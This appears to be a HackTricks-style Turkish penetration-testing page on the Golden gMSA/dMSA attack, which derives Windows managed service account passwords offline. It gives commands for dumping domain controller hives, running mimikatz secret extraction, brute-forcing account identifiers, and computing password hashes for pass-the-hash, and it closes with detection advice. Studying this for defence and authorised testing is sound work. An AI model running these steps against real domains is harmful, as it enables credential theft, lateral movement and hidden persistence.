# Golden gMSA/dMSA Saldırısı (Yönetilen Hizmet Hesabı Parolalarının Çevrimdışı Türevlenmesi)

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Windows Yönetilen Hizmet Hesapları (MSA), parolalarını manuel olarak yönetmeye gerek kalmadan hizmetleri çalıştırmak için tasarlanmış özel ilkeleridir. İki ana türü vardır:

1. **gMSA** – grup Yönetilen Hizmet Hesabı – `msDS-GroupMSAMembership` niteliğinde yetkilendirilmiş birden fazla ana bilgisayarda kullanılabilir.
2. **dMSA** – devredilmiş Yönetilen Hizmet Hesabı – gMSA'nın (önizleme) halefidir, aynı kriptografiye dayanır ancak daha ayrıntılı devretme senaryolarına izin verir.

Her iki varyant için de **parola her Domain Controller (DC)** üzerinde düzenli bir NT-hash gibi **saklanmaz**. Bunun yerine her DC, mevcut parolayı anlık olarak aşağıdaki üç girdiden **türetebilir**:

* Orman genelinde **KDS Kök Anahtarı** (`KRBTGT\KDS`) – her DC'ye `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` konteyneri altında çoğaltılan rastgele oluşturulmuş GUID adında bir sır.
* Hedef hesap **SID**.
* `msDS-ManagedPasswordId` niteliğinde bulunan her hesap için bir **ManagedPasswordID** (GUID).

Türevleme işlemi: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 baytlık blob nihayetinde **base64-şifrelenir** ve `msDS-ManagedPassword` niteliğinde saklanır. Normal parola kullanımı sırasında Kerberos trafiği veya alan etkileşimi gerekmemektedir – bir üye ana bilgisayar, üç girdi bilindiği sürece parolayı yerel olarak türetebilir.

## Golden gMSA / Golden dMSA Saldırısı

Bir saldırgan, tüm üç girdi **çevrimdışı** elde edebilirse, **orman içindeki herhangi bir gMSA/dMSA için geçerli mevcut ve gelecekteki parolaları** hesaplayabilir ve DC'ye tekrar dokunmadan, aşağıdakileri atlayarak:

* Kerberos ön kimlik doğrulama / bilet talep günlükleri
* LDAP okuma denetimi
* Parola değiştirme aralıkları (önceden hesaplayabilirler)

Bu, hizmet hesapları için bir *Golden Ticket* ile benzerlik göstermektedir.

### Ön Koşullar

1. **Bir DC'nin** (veya Kurumsal Yönetici) **orman düzeyinde ele geçirilmesi**. `SYSTEM` erişimi yeterlidir.
2. Hizmet hesaplarını listeleme yeteneği (LDAP okuma / RID brute-force).
3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) veya eşdeğer kodu çalıştırmak için .NET ≥ 4.7.2 x64 iş istasyonu.

### Aşama 1 – KDS Kök Anahtarını Çıkar

Herhangi bir DC'den döküm alın (Hacim Gölge Kopyası / ham SAM+SECURITY hives veya uzaktan sırlar):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too
```
`RootKey` (GUID adı) olarak etiketlenen base64 dizesi, sonraki adımlarda gereklidir.

### Aşama 2 – gMSA/dMSA nesnelerini listele

En az `sAMAccountName`, `objectSid` ve `msDS-ManagedPasswordId` değerlerini al:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) yardımcı modları uygular:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
### Aşama 3 – Yönetilen Parola Kimliğini Tahmin Et / Keşfet (eksik olduğunda)

Bazı dağıtımlar `msDS-ManagedPasswordId`'yi ACL korumalı okumadan *çıkarır*.
GUID 128 bit olduğundan, basit bir brute force uygulanabilir değildir, ancak:

1. İlk **32 bit = Hesap oluşturma Unix epoch zamanı** (dakika çözünürlüğü).
2. Ardından 96 rastgele bit gelir.

Bu nedenle, her hesap için **dar bir kelime listesi** (± birkaç saat) gerçekçidir.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Araç, aday şifreleri hesaplar ve bunların base64 blob'unu gerçek `msDS-ManagedPassword` niteliği ile karşılaştırır - eşleşme doğru GUID'i ortaya çıkarır.

### Aşama 4 – Çevrimdışı Şifre Hesaplama ve Dönüştürme

ManagedPasswordID bilindiğinde, geçerli şifre bir komut uzaklıktadır:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>

# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
```
Sonuçta elde edilen hash'ler, gizli **lateral movement** ve **persistence** sağlamak için **mimikatz** (`sekurlsa::pth`) veya **Rubeus** ile enjekte edilebilir.

## Tespit ve Azaltma

* **DC yedekleme ve kayıt defteri hives okuma** yetkilerini Tier-0 yöneticileri ile sınırlayın.
* DC'lerde **Directory Services Restore Mode (DSRM)** veya **Volume Shadow Copy** oluşturulmasını izleyin.
* `CN=Master Root Keys,…` ve hizmet hesaplarının `userAccountControl` bayraklarındaki okuma / değişiklikleri denetleyin.
* Alışılmadık **base64 şifre yazımları** veya aniden hizmet şifresinin birden fazla hostta yeniden kullanılmasını tespit edin.
* Tier-0 izolasyonunun mümkün olmadığı durumlarda yüksek ayrıcalıklı gMSA'ları, düzenli rastgele döngülerle **klasik hizmet hesaplarına** dönüştürmeyi düşünün.

## Araçlar

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – bu sayfada kullanılan referans uygulaması.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – türetilmiş AES anahtarları kullanarak bilet geçişi.

## Referanslar

- [Golden dMSA – yetkilendirme atlatma için devredilen Yönetilen Hizmet Hesapları](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Semperis/GoldenDMSA GitHub deposu](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA güven saldırısı](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
